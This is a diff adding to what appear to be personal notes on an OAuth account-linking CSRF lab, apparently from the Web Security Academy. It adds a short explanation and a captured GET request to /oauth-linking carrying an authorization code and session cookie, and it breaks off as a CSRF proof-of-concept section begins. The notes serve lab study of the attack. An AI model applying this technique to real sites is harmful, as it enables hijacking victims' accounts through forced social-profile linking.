@@ -145,6 +145,28 @@ Authorization: Bearer z0y9x8w7v6u5
 
 ---------------
 
+- Csrf can be triggered by sending the authorization code to the victim to link your social media profile to his/her account. Callback to the redirect_uri via browser redirect should be done with the state hash included in the `authorization request`.
+
+```http
+GET /oauth-linking?code=7706vS22XU7a0_7Y6GPlqfZGp-0me34AOyF1-euZB5y HTTP/2
+Host: 0a5b00f7049636f180e20366002f00ca.web-security-academy.net
+Cookie: session=vOIyOWOnYdQ5baX5r8y0MtQm15FfNEXD
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Referer: https://0a5b00f7049636f180e20366002f00ca.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+```
+
 - Csrf POC-:
 
 ```html
